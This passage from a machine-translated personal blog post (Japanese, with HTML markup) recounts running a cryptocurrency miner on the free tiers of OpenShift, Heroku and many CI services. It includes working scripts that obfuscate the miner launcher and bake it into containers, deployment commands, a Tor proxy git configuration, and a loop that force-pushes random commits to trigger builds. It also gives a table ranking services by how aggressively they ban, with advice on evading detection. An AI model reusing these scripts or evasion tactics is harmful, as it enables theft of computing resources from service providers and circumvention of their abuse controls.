[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>これは、yamlテンプレートを必要とするマイニングコンテナを構築するために使用されるスクリプトでした。<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>しかし、プロセス全体にはかなりのステップが含まれていました！<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>擬似コードの場合：<ul><li><p>プロジェクトを作成する<li><p>画像なしでアプリケーションを作成する<li><p>マイニングコンテナを構築する<li><p>デプロイ設定でコンテナをデプロイする（kubernetes抽象化）<li><p>展開を展開する</ul><p>NS<code>build-build</code> 代わりにスクリプトが作成しました<em> 建てる</em> 一度に数時間採掘するコンテナ。ビルドと通常のポッドはopenshiftに別々のリソースがあるため、両方を活用しました。 Openshiftは、4つの異なるリリース（おそらくそれ以上、しばらくして追跡を停止しました）を超え、それぞれが構成の変更を必要とし、アップグレードパスがなく、すべてが迅速に繰り返されたため、全体的に悪い経験でした。ビルド/ポッドがストールし、ガベージコレクションが行われない場合...通常は手動で再起動することがありますが、kubernetesはバグが多かったかもしれません:)<p>Herokuの構成は少し単純でした（kubernetesは含まれていません）。 openshiftと同様のコンテナービルドを除けば、残りは2つのcliコマンドのみでした。<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>コンテナは、Dockerを使用してherokuレジストリに直接プッシュされました。<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> heroku（この記事の執筆時点ではまだ無料枠が残っています）との摩擦は、dynoは月に22日間しか実行できないため、毎月手動で管理する必要があり、これも不格好で退屈です。彼らは最初にいくつかの禁止ウェーブを実行しました、そして次に彼らはTORを通して登録を無効にしました、私はこれの原因であったと確信しています。<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> CIコンテナまたはVM</a></h3><p>これらは、ドロッパーにとって最も相乗的なターゲットでした。沢山あります<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> 多くの企業は、ハイテクインフラストラクチャビジネスである程度の市場シェアを獲得することを期待して、無料の階層を提供する投資家のお金を燃やしています。<p>これらのサービスはすべて、さまざまなリソースを提供し、さまざまな構成要件を持ち、さまざまな環境で実行されます。アカウント登録の自動化を考えたことはありませんでした。そのようなことはプログラムするのが恐ろしいので、常に避けようとしているので、どのようなスパム対策応答が得られるのか興味があったので、しばらくの間手動登録に耐えました（そして他とはなんと違うのでしょう！）。スパムの処理方法から、会社の管理についていくつか推測できます。<ul><li><p>それは禁止波を実行しますか？次に、それらには厳密ではないポリシーがあり、問題は手動でケースバイケースで処理されます<li><p>電話による確認が必要ですか？彼らは過去にすでに虐待されていました<li><p>彼らは大量のリソース使用に対応していますか？彼らは厳しい予算で実行されています<li><p>アカウント制限またはシャドウ禁止を適用しますか？彼らが禁止をシャドウする場合、彼らは平均的なシステム管理者を持っています。</ul><p>哲学的な質問もあります。サービスによってシステムを長期間悪用できる場合、それは負荷を処理できる最先端のインフラストラクチャを備えていることを意味しますか、それとも単にシステムの制御が不十分であることを意味しますか？また、アクセシビリティとセキュリティのバランスを考慮する必要があります。システムのセキュリティが高すぎると、ユーザーの定着率が低下する可能性があります。<p>これは私が展開したいくつかのサービスを示す表です：<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>構成<th style=text-align:center>パフォーマンス<th style=text-align:center>バンハンマー<tr><td style=text-align:center>ビットライズ<td style=color:red;text-align:center>悪い<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>トラヴィス<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<td style=color:green;text-align:center>良い<tr><td style=text-align:center>コードシップ<td style=color:#ff0;text-align:center>中くらい<td style=color:red;text-align:center>悪い<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>中くらい<td style=color:green;text-align:center>良い<td style=color:green;text-align:center>良い<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>悪い<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>セマフォ<td style=color:green;text-align:center>良い<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<td style=color:green;text-align:center>良い<tr><td style=text-align:center>岸壁<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>悪い<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<td style=color:red;text-align:center>悪い<tr><td style=text-align:center>Azureパイプライン<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<td style=color:red;text-align:center>悪い<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>悪い<td style=color:#ff0;text-align:center>中くらい<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>バディ<td style=color:red;text-align:center>悪い<td style=color:red;text-align:center>悪い<td style=color:red;text-align:center>悪い<tr><td style=text-align:center>ドローン<td style=color:red;text-align:center>悪い<td style=color:green;text-align:center>良い<td style=color:red;text-align:center>悪い<tr><td style=text-align:center>提供者<td style=color:red;text-align:center>悪い<td style=color:#ff0;text-align:center>中くらい<td style=color:red;text-align:center>悪い<tr><td style=text-align:center>ネバーコード<td style=color:red;text-align:center>悪い<td style=color:green;text-align:center>良い<td style=color:#ff0;text-align:center>中くらい<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>悪い<td style=color:green;text-align:center>良い<td style=color:red;text-align:center>悪い</table><p>この文脈では、<span style=color:green> 良い</span> 構成とは、構成にそれほど時間がかからなかったことを意味します。<code>ci</code> マイニングプロセスの仕事（リポジトリのドットファイルではなくWebダッシュボードに依存するすべてのサービスが雑用だったように）、<span style=color:red> 悪い</span><code>ban-hammer</code> これは、サービスへの登録が困難であったか、アカウントがより積極的に禁止されることを意味します。<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> ビットライズ</a> プロジェクトのセットアップ、環境、ターゲットアーキテクチャ、実行プロセスなどの推測が必要なため、ビルドのセットアップに非常に時間がかかり、構成の評価が低くなりました。<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> バディ</a> 、[Codefresh]には、多くの手動の非宣言型構成手順もありました。<p>[Azure-pipelines]などのサービス、<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> バディ</a> アカウントにシャドウ禁止を適用しますが、構成に問題があるかどうかを推測できるため、シャドウ禁止は不適切です。一部のサービスでは、禁止の理由を推測できます（ビルドに時間がかかりすぎた、または短期間に何度もビルドした）、[Azure-pipelines]のような他のサービスでは、何らかのフィンガープリントが適用されたと思いますリソースを乱用しなくても禁止が行われていたため、ユーザーリポジトリに紺碧と指紋も制限されました<code>DNS</code> パブリックビルドマシン内でのアクセス。これは、アドホックトンネルで克服する必要のある追加の摩擦でした。<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> ドローン</a> 16コア以上のプロセッサ全体にアクセスできましたが、2回のビルド後に禁止されました<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> コードシップ</a> また、強力なビルドホストへのアクセスを提供し、ドローンほど積極的に禁止しませんでした。<p>収益性のためではなく、使いやすさと利便性のために（他のプロジェクトでも）私のお気に入りのサービスは<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> トラヴィス</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> セマフォ</a> と<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Dockerハブ</a> 。 Travisは標準CIのようなもので、非常に柔軟性があります。Semaphoreが唯一です。<code>DSL</code> にとって<code>CI</code> 他のUIのようにスパゲッティ化されたチェックボックスの無限のシーケンスではなく、Dockerファイルをビルドにマップするための単純さのためにDockerを使用するのではなく、親しみやすく、うまく見えました。<h3 id=builds_configs><a class=header-anchor href=#builds_configs> 構成を構築します</a></h3><p>ビルドは、Webサービスによって提供されるcronジョブまたはgitcommitのいずれかによってトリガーされました。そのため、すべてのgitコミットを管理するために、アクセストークンまたはsshキーのポイ捨てを追跡する必要がありました。コミットを過剰にスパムしないこと、およびgitを構成するリポジトリにプッシュするときにプロキシを使用することも重要でした。<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>gitホスティングサービスを使用して、githubは禁止についてもう1つ徹底しましたが、それらはciサービス管理者による乱用報告でのみ実行されました。gitlabはCIトライアルを（不注意に）更新しようとしたときに一度禁止ウェーブを実行しました。私はbitbucketアカウントの禁止を受けたことがありません。 git commitを（強制的に）プッシュするために、gitリポジトリに再タグ付けする長時間実行ループがあります。<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>この方法で強制的にプッシュすることは、githubがあまり好まないことであり、アカウントにフラグが立てられる原因となった可能性があります。別のコミットを強制的にプッシュするタスクを実行するタガー関数は、ランダム化されたコミットを提供するWebサイト（非常に簡単に検索できます）を使用します。コミットの内容自体が私の場合は明らかに疑わしいので、これがどれほど役立つかはわかりません。また、このコマンドによって返されるコミットには冒とく的な言葉が含まれている可能性があるため、私のコミットの1つが、卑猥な言葉でgitコミットを追跡するツイッターボットによって取得されました。事件後、悪い言葉のブラックリストを追加しました。<p>難読化されたgitコミットと難読化されたgitリポジトリについてはあまり詳しく調べていません。システムが環境（モバイルアプリなど）を認識しない場合はビルドをセットアップできなかったため、より複雑なリポジトリを使用していた唯一の例はBitriseでしたが、それでもローテーションはなく、常に同じでしたリポジトリ、見つけるのは非常に簡単です。<p>全体として、マイニングに最適な時間の周りにベルカーブをプロットする必要がある場合<em> それなし</em>テストされたすべてのサービスでアカウントが禁止されるのは、1日1回、約1時間のビルド期間が中心です。 CPUコアの場合、いくつかのアウトライアー（ドローンなど）を除いて、ビルドはリソースが制限されたVMまたはコンテナー内で実行されるため、ほとんどのサービスは、提供されたリソースの全量を使用することを期待しています...そしてコンパイルは通常、次のようなタスクです。 CPUを飽和させるため、統計的な関連性はありません。直感的には、平均的な開発者が1日に1回ビルドするので、平均から外れた場合はフラグが立てられることを期待する必要があります。<h2 id=conclusions><a class=header-anchor href=#conclusions> 結論</a></h2><p>それは価値がありました？ネットワーキングの部分は間違いなく興味深いものでした。アカ​​ウント登録の処理は明らかに最悪の部分でした。結局のところ、誰もが無限の確認メールをクリックして、気が遠くなるようなUI手順を繰り返すのが好きです。スパム自動化ソフトウェアを書くことも退屈です（あなたはほとんどダムAPIを突っついているので）、そしてこの仮定（そしてこれが決して深刻なことではなかったという事実）で私はそれを考えさえしませんでした。儲かった？ピーク時には、次のようなものに到達していました<code>300$</code> 毎月、ベネズエラ人には十分かもしれませんが、私にとってはそうではありません:)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> 不機嫌そうなシステム管理者</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>これは多くのプライバシーの前提を破ることになりますが、現在の問題があるときはいつでもそれらのほとんどが内部を覗き見していると確信していますが、これはコンテナベースのランタイムの問題にすぎませんが、VMはほとんどブラックボックスです。</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>モネロノードに組み込まれたマイナーは、バックグラウンドに対応するための作業を行いましたが、xmrigの配布はバックグラウンドに対応することに重点を置いていませんでした。</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>一部のプールは、異なる接続ポートで異なる難易度を提供し、ジョブの難易度をマイナーが送信した共有に合わせる傾向がありますが、プロキシの粒度はプールを妨げるため、さらに便利でした<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> 固定する</a> （プールを実際に切り替えたことはありませんが）。</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>設定が突然現れてファイルシステムから消えたとき、それは幸せではありませんでした</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>私たちは話しません<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> 層プロトコル</a> で実装されているものは何でも処理する必要があるため<em> どちらも</em> プールとマイナー...これは通常最低限のものであり、場合によっては非標準の拡張機能があります。</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>フルバッシュに行くことはありません:)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>カーネルが実行可能ファイルのメモリレイアウトでアドレスを探し、ファイルシステムにアクセスしてクラッシュを引き起こす可能性があるため、プロセスが実行時に追加機能をロードしたときに何が起こるかについては調べていません。</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>制限は任意であり、CPU時間は1秒未満、メモリは128M未満、アウトバウンド接続はブロックされます。</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>少しの忍耐があれば、cpanelアカウントスペースの周りにブートストラップされた環境で完全なsshインスタンスを実行することもできます。<em> それなし</em> ホスティングプロバイダーによって無効にされる傾向があるcpanel組み込みSSHにアクセスできる。</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshiftは、1年間の無料利用枠から3か月から1か月になり、電話認証が必要になりました。サービスを悪用しているのは私だけではないことを保証できます。</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Herokuの無料利用枠コンテナは、リソースが非常に豊富で、4c / 8t（仮想）CPU、十分なRAM、および大容量のストレージを提供します（ただし、永続的ではなく、dynoのシャットダウン時に破棄されます）。</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>彼らはより厳格な登録規則を追加します、いくつかの禁止の後、私はそれに貢献したかもしれません。</table><p><div class=page-foot><div class=copyright></div></div></div><div class=page__footer><footer><div class=page__footer-copyright>©untoreh-Poweredby<a href=https://github.com/tlienart/Franklin.jl> フランクリン</a></div><div class=page__footer-links>- <ul><li><a href=/ja/sitemapxml> サイトマップ</a></li> | <li><a href=/ja/tag> タグ</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>